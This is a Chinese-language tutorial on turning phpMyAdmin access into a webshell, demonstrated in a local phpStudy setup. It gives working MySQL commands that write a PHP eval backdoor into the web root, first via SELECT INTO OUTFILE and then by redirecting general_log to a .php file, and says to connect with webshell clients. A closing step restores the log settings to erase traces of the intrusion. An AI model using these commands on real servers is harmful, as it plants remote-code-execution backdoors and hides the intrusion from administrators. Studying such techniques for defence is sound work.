## 前言

来到phpmyadmin页面后如何getshell呢？下面介绍两种方法

![1618802521_607cf7595eb6f2966db1f.png!small?1618802521918](https://image.3001.net/images/20210419/1618802521_607cf7595eb6f2966db1f.png!small?1618802521918)

## 一、select into outfile直接写入

### 1、利用条件

> 对web目录需要有写权限能够使用单引号(root)
>
> 知道网站绝对路径(phpinfo/php探针/通过报错等)
>
> secure_file_priv没有具体值

### 2、查看secure_file_priv值

    
    
    show global variables like '%secure%';

![](https://image.3001.net/images/20210416/1618573895_60797a47b72868a1ef040.png!small)

关于secure_file_priv配置介绍：

secure_file_priv 是用来限制 load dumpfile、into outfile、load_file()
函数在哪个目录下拥有上传或者读取文件的权限

    
    
    当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权
    当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权
    当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权

我这里的secure_file_priv值为NULL，所以不能够导入或导出

![](https://image.3001.net/images/20210416/1618573896_60797a487969b5908a4f9.png!small)

secure_file_priv这个值是只读变量，只能通过配置文件修改。如果管理员没有配置，那么我们是无法进行写入shell的，这里我为了测试能否写入修改一下

在MySQL的配置文件my.ini中进行配置：

![](https://image.3001.net/images/20210416/1618573897_60797a491b887b3fa7aab.png!small)

修改后secure_file_priv的值如图所示：

![](https://image.3001.net/images/20210416/1618573897_60797a49b5a09a827de66.png!small)

### 3、写入一句话

    
    
    select '<?php @eval($POST[1]); ?>' INTO OUTFILE 'D:\\phpStudy\\PHPTutorial\\WWW\\a.php'

这里需要注意的一个点是路径需要用"\\\"

![](https://image.3001.net/images/20210416/1618573898_60797a4a57d358f6a5482.png!small)

查看下根目录

![](https://image.3001.net/images/20210416/1618573898_60797a4af2d7d62bf49d2.png!small)

## 二、利用全局日志写shell

### 1、查看配置

查看mysql的日志状态，默认是关闭的，因为这个日志的量非常大对资源是一个比较大的开销

SHOW VARIABLES LIKE '%general%'

general_log_file为日志保存的位置

![](https://image.3001.net/images/20210416/1618573899_60797a4b89ba7f976c5f2.png!small)

### 2、开启general_log模式

开启general_log
的作用：开启它可以记录用户输入的每条命令，会把其保存在C:\phpStudy\MySQL\data\stu1.log的文件中，其实就是我们常说的日志文件利用思路：开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用

这里注意：在修改log路径前，源路径一定要提前记录下来，我们获取shell后还要恢复原来的路径

    
    
    set global general_log = on;

![](https://image.3001.net/images/20210416/1618573900_60797a4c3667d10d01a38.png!small)

再查看一下日志已经开启，这时我们就可以通过全局日志写shell进根目录

![](https://image.3001.net/images/20210416/1618573900_60797a4ccf97705125431.png!small)

### 3、修改日志目录为shell地址

    
    
    set global general_log_file='C:\\phpStudy\\MySQL\\data\\shell.php';

![](https://image.3001.net/images/20210416/1618573901_60797a4da137f9095a660.png!small)

### 4、写入shell

因为开启了日志记录功能，所执行的sql语句都会被记录在日志中

    
    
    select '<?php eval($_POST[cmd]);?>'

![](https://image.3001.net/images/20210416/1618573902_60797a4e44298d159ccba.png!small)

查看下日志，发现sql语句已经被记录到了日志中，直接用菜刀或者蚁剑连接即可

![](https://image.3001.net/images/20210416/1618573902_60797a4eda85fb58d24cd.png!small)

### 5、抹除痕迹

    
    
    set global general_log_file='C:\\phpStudy\\MySQL\\data\\stu1.log';
    set global general_log = off;

![](https://image.3001.net/images/20210416/1618573903_60797a4f9ed9df5705c99.png!small)

![](https://image.3001.net/images/20210416/1618573904_60797a503c20f77f02d8e.png!small)

再使用日志查看命令发现已经恢复

    
    
    SHOW VARIABLES LIKE '%general%'

![](https://image.3001.net/images/20210416/1618573904_60797a50cd85867a779a9.png!small)

